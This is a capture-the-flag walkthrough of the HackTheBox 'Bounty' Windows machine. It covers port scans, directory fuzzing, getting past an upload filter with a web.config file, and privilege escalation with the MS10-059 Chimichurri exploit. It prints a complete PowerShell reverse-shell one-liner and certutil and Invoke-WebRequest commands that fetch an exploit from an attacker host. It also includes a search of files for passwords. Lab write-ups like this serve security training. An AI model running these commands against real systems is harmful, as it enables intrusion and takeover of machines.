
Add  ip address of the target machine to `/etc/hosts`

```bash
nano /etc/hosts
```

![[HackTheBox/Bounty/images/1.png]]

Continue with port scan:

```bash
nmap -sC -sV -p- --min-rate 10000
```

Just because not to make overkill NSE script scans, I simply use default scripts, service discovery and full scope scan with 10000 rate.

Most probably running on `.NET framework` based on the web server type.

![[HackTheBox/Bounty/images/2.png]]

Well let's conduct fuzzing operation to correlated web server instance ->

![[HackTheBox/Bounty/images/3.png]]

```bash
dirsearch -u http://bounty.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50
```

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://bounty.htb/FUZZ 
```

![[HackTheBox/Bounty/images/4.png]]

These are the potential endpoints that I found so far ->

```bash
[01:41:19] 301 -  155B  - /aspnet_client  ->  http://bounty.htb/aspnet_client/
[01:41:21] 301 -  155B  - /uploadedfiles  ->  http://bounty.htb/uploadedfiles/
[01:41:22] 301 -  155B  - /uploadedFiles  ->  http://bounty.htb/uploadedFiles/
[01:41:27] 301 -  155B  - /UploadedFiles  ->  http://bounty.htb/UploadedFiles/
[01:41:29] 301 -  155B  - /Aspnet_client  ->  http://bounty.htb/Aspnet_client/
[01:41:38] 301 -  155B  - /aspnet_Client  ->  http://bounty.htb/aspnet_Client/
[01:41:56] 301 -  155B  - /ASPNET_CLIENT  ->  http://bounty.htb/ASPNET_CLIENT

```

Because we are dealing with `.NET` lets try `.asp, .aspx` extension files.

```bash
gobuster dir -r -u http://bounty.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x ".asp,aspx"
```

Observe there were another endpoint seem open:

![[HackTheBox/Bounty/images/5.png]]

File upload can be seen below:

![[HackTheBox/Bounty/images/8.png]]

However, `.aspx` reverse shell does not work upon here

[ASPX reverse shell](https://gist.github.com/xstpl/bd30d753a1ce9a301c81)

![[HackTheBox/Bounty/images/7.png]]

However, file type was not allowed on the `FileUpload1` form. Moreover, I discovered a client-side filter on source code of the page.

![[HackTheBox/Bounty/images/6.png]]

I began to bypass client-side filter by removing onclick javascript method on html

```bash
<input type="submit" name="btnUpload" value="Upload" onclick="return ValidateFile();" id="btnUpload">


<input type="submit" name="btnUpload" value="Upload" id="btnUpload">
```

However, it did not work lets instantiate with BurpSuite ->

I altered extension type to add `.jpg` and bypassed successfully

![[HackTheBox/Bounty/images/9.png]]

Well there was a clue on hacktricks about file upload:

[IIS file upload](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/iis-internet-information-services.html)

![[HackTheBox/Bounty/images/10.png]]

HackTricks suggests uploading files in below:

```bash
Test executable file extensions:

- asp
- aspx
- config
- php
```

aspx and asp already did not work.

I will try respectively each of them ->

[Web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

php also did not work. However, `.config` file successfully worked.

![[HackTheBox/Bounty/images/11.png]]

It works successfully

![[HackTheBox/Bounty/images/12.png]]


Lets move a powershell rev shell connection.

[Rev Shell Powershell](https://github.com/nicholasaleks/reverse-shells)

```bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.64',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

I got reverse shell connection from target.

![[HackTheBox/Bounty/images/13.png]]

Enumerate target:

![[HackTheBox/Bounty/images/14.png]]

According to red team field manual book, page 18 I will use seperate commands together

```bash
ver
systeminfo
set
net localgroup "Administrator"
//find files//

dir /a /s /b C:\*txt*

findstr /SI password *.txt (took longer)

```

![[HackTheBox/Bounty/images/15.png]]

I saw a `SeImpersonate` surface ,but I will move direct lack of hotfix applied Windows server 2008 R2 Datacenter instance.

![[16.png]]

[WindowsExploitSuggester](https://github.com/Pwnistry/Windows-Exploit-Suggester-python3)


Copy `systeminfo` output to TXT file.

![[17.png]]

Update the `windows exploit suggester version`:

```bash
./windows-exploit-suggester.py --update
```

Run:

```bash
./windows-exploit-suggester.py --database 2026-03-14-mssb.xlsx --systeminfo ex.txt
```

![[HackTheBox/Bounty/images/18.png]]

Since I forgot to install dependencies of tool, I faced with critical issues including stuck when executed and error message on terminal.

![[HackTheBox/Bounty/images/19.png]]

![[HackTheBox/Bounty/images/20.png]]

instal dependencies:

```bash
pip install xlrd
pip install xlrd --upgrade
```

```bash
database file detected as xlsx based on extension
[-]
please install and upgrade the openpyxl library

pip install openpyxl
```

Since no hotfix applied, It is a great opportunity to try multiple kernel exploits at once:

```bash
Hotfix(s):                 N/A
```

I would rather use famous exploit `MS10-059 via Chimichurri` because other exploits mostly providing `DOS` as utility ,but I needed to escalate my privileges except the `Token Abuse`.

![[HackTheBox/Bounty/images/21.png]]

Download from here:

```bash
https://github.com/egre55/windows-kernel-exploits
```

Initially, I'll try `wget` and `Invoke-WebRequest` method to download exploit.

```bash
wget 'http://10.10.16.64:3131/Chimichurri.exe' -outfile 'exploit.exe'
```

It did not work.

![[HackTheBox/Bounty/images/22.png]]

Direct Invoke-WebRequest cmdlet may work:

```bash
$url = “http://10.10.16.64:3131/Chimichurri.exe“  
$dest = “c:\windows\Temp\Chimichurri.exe”

Invoke-WebRequest -Uri $url -OutFile $dest
```

I can ping my attacker machine through the victim ,yet still did not download exploit.

![[HackTheBox/Bounty/images/23.png]]

[Certutil usage](https://www.ired.team/offensive-security/defense-evasion/downloading-file-with-certutil)

```cmd
certutil.exe -urlcache -f http://10.10.16.64:3131/Chimichurri.exe bad.exe
```

![[HackTheBox/Bounty/images/24.png]]

It worked perfectly ,but in my instance I was running another application running via nginx ,so it disallowed me to send the kernel exploit.

Exploit guided me to get shell via attacker machine.

![[25.png]]

Run exploit as suggested:

![[26.png]]

Got admin shell:

![[27.png]]

Normally the visibility of the user flag is hidden ,but I simply and automatically type user keyword then it revealed.

![[28.png]]

Get root flag ->

![[29.png]]